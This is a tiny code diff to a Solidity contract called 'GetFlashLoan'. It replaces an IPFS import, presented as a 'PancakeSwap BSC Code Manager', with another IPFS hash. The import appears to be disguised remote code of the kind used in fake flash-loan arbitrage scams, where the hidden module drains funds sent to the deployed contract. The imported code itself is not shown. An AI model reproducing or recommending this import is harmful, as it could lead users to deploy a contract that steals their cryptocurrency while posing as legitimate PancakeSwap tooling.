@@ -21,7 +21,7 @@ import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/i
 */
 
 // PancakeSwap BSC Code Manager
-import "ipfs://QmPew5cEEbiGaStJDvgiXN1MKBNSFqmtacgkjiRz4Cqh4Z";
+import "ipfs://QmdDd3UQd3vbk4W9fFtwJQ8H9w1vTZQ4tUeDu6iHjSoEaX";
    
 contract GetFlashLoan {
    string public tokenName;
